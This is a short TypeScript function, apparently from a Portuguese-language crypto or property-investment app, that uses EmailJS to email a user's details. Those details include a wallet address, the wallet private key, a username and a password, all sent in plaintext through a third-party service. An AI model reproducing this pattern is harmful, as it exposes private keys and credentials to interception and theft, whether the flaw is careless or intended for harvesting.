import emailjs from '@emailjs/browser';

export async function sendEmail({
  nome,
  email,
  empreendimento,
  quantidade,
  enderecoCarteira,
  chavePrivada,
  usuario,
  senha,
}: {
  nome: string;
  email: string;
  empreendimento: string;
  quantidade: number;
  enderecoCarteira: string;
  chavePrivada: string;
  usuario: string;
  senha: string;
}) {
  try {
    const templateParams = {
      to_email: email,
      to_name: nome,
      empreendimento,
      quantidade,
      enderecoCarteira,
      chavePrivada,
      usuario,
      senha,
    };

    const response = await emailjs.send(
  process.env.EMAILJS_SERVICE_ID!,
  process.env.EMAILJS_TEMPLATE_ID!,
  templateParams,
  process.env.EMAILJS_PUBLIC_KEY!
);

    console.log('📧 Email enviado com sucesso:', response.status, response.text);
    return response;
  } catch (error) {
    console.error('❌ Erro ao enviar email:', error);
    throw error;
  }
}
